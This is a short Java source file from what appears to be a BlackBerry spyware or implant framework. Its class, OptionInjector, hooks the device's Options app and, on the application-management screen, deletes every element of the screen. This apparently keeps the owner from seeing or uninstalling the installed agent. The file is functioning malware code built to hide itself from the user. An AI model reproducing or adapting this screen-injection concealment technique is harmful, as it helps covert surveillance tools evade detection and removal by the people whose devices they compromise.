package blackberry.injection.injectors;

import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class OptionInjector extends AInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("OptionInjector", DebugLevel.VERBOSE);
    //#endif
    
    public String getAppName() {
        return "Options";
    }

    public String getCodName() {
        return "net.rim.device.apps.internal.options.OptionsApp";
    }

    public String[] getWantedScreen() {
        return new String[]{"AppMgmtScreen"};
    }

    public void playOnScreen(Screen screen) {
        //#ifdef DEBUG
        debug.trace("playOnScreen");
        //#endif
        synchronized(UiApplication.getUiApplication().getAppEventLock()){
            screen.deleteAll();
        }
    }

}
